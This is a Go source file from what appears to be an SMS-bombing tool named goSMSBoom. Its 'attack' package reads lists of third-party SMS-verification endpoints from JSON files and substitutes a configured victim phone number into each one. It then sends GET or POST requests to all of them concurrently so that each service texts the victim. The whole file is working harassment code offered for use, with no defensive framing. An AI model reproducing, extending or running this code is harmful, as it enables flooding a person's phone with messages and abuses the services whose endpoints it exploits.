package attack

import (
	"encoding/json"
	"goSMSBoom/config"
	"goSMSBoom/log"
	"goSMSBoom/model"
	"goSMSBoom/utils"
	"strings"
)

var ConcurrentArray [][]*model.SMSBoom

func StartBoom() error {
	for i := 0; i < len(ConcurrentArray); i++ {
		booms := ConcurrentArray[i]
		go func() {
			err := dealRes(booms)
			if err != nil {
				log.Println("处理失败:", err)
			}
		}()
	}
	return nil
}

func Start() error {
	SMSBoomArr, err := ready()
	if err != nil {
		log.Println("准备程序失败", err)
		return err
	}

	count := config.Configs.ThreadCount

	var i = len(SMSBoomArr) / count

	for k := 0; k < i; k++ {
		var start = k * count
		var end = (k + 1) * count
		booms := SMSBoomArr[start:end]
		ConcurrentArray = append(ConcurrentArray, booms)
	}
	return nil
}

func dealRes(booms []*model.SMSBoom) error {
	for j := 0; j < len(booms); j++ {
		boom := booms[j]
		//	Desc   string            `json:"desc"`
		//	Url    string            `json:"url"`
		//	Method string            `json:"method"`
		//	Header map[string]string `json:"header"`
		//	Data   map[string]any    `json:"data"`
		desc := boom.Desc
		url := boom.Url
		method := boom.Method
		header := boom.Header
		data := boom.Data

		marshal, err := json.Marshal(data)
		if err != nil {
			log.Println("api.json中的", desc, "的data无法解析成为json")
			return err
		}

		if method == "GET" {
			dos := utils.NewHttpDos(url, marshal, header)
			_, err = dos.Get()
			if err != nil {
				log.Println(desc, "get请求失败")
				return err
			} else {
				log.Println("成功发送", desc, "短信")
			}
		} else if method == "POST" {
			dos := utils.NewHttpDos(url, marshal, header)
			_, err = dos.Post()
			if err != nil {
				log.Println(desc, "post请求失败")
				return err
			} else {
				log.Println("成功发送", desc, "短信")
			}
		}
	}
	return nil
}

func ready() ([]*model.SMSBoom, error) {
	httpInfo, err := utils.GetFileByteArr("api.json")
	if err != nil {
		log.Println("解析api.json失败", err)
		return nil, err
	}
	getApi, err := utils.GetFileByteArr("GETAPI.json")
	if err != nil {
		log.Println("GETAPI.json", err)
		return nil, err
	}
	var sms []*model.SMSBoom
	s := string(httpInfo)
	s = strings.ReplaceAll(s, "[phone]", config.Configs.Phone)
	err = json.Unmarshal([]byte(s), &sms)
	if err != nil {
		log.Println("json解析失败", err)
		return nil, err
	}
	var sms2 []*model.SMSBoom
	var sArr []string
	s2 := string(getApi)
	s2 = strings.ReplaceAll(s2, "[phone]", config.Configs.Phone)
	err = json.Unmarshal([]byte(s2), &sArr)
	for i := range sArr {
		sms2 = append(sms2, model.NewSMSBoom("不知名商家", sArr[i], "GET", nil, nil))
	}
	sms = append(sms, sms2...)
	if err != nil {
		log.Println("json解析失败", err)
		return nil, err
	}

	return sms, nil
}
